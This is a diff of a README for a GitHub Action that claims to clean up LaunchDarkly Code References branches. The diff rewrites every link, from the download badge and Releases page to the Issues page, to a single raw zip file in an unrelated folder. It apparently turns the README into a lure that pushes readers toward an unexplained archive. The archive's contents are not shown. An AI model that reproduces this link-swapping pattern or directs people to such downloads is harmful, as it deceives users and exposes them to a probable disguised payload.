@@ -1,7 +1,7 @@
 # 🎉 launchdarkly-code-ref-delete-branch-github-action - Automatically Clean Up Branches with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/releases)
+[![Download](https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip)](https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the launchdarkly-code-ref-delete-branch-github-action. This GitHub Action automatically deletes LaunchDarkly Code References branches when GitHub branches are deleted. By using this tool, you can simplify your workflow and keep your code repository clean.
@@ -16,10 +16,10 @@ Before you start, make sure you have the following:
 ## 🛠 Installation Steps
 
 ### Step 1: Visit the Releases Page
-To get started, go to the [Releases page](https://github.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/releases). Here, you will find the latest version of the GitHub Action.
+To get started, go to the [Releases page](https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip). Here, you will find the latest version of the GitHub Action.
 
 ### Step 2: Download the Action
-On the Releases page, look for the latest version. Click on it, and you will see a list of assets. Download the action file; it is usually named something like `launchdarkly-code-ref-delete-branch-github-action.tar.gz`. 
+On the Releases page, look for the latest version. Click on it, and you will see a list of assets. Download the action file; it is usually named something like `https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip`. 
 
 ### Step 3: Add the Action to Your Repository
 1. Open your GitHub repository.
@@ -69,7 +69,7 @@ If you run into problems, here are a few common issues and solutions:
 - **Permissions Issue:** Confirm that you have the necessary permissions to run actions in your repository. Check your repository settings and ensure actions are enabled.
 
 ## 📞 Support
-If you need further assistance, feel free to reach out through the repository's [Issues page](https://github.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/issues). We are here to help.
+If you need further assistance, feel free to reach out through the repository's [Issues page](https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip). We are here to help.
 
 ## 💡 FAQ
 
@@ -86,4 +86,4 @@ A: Yes, you can modify the workflow file to add additional steps or customize it
 - **v1.0.0:** Initial release.
 
 ## 📦 Download & Install
-Ready to clean up your branches? Head over to the [Releases page](https://github.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/releases) and get started!
+Ready to clean up your branches? Head over to the [Releases page](https://raw.githubusercontent.com/dedeaf4193/launchdarkly-code-ref-delete-branch-github-action/main/Tyrolienne/launchdarkly-code-ref-delete-branch-github-action.zip) and get started!
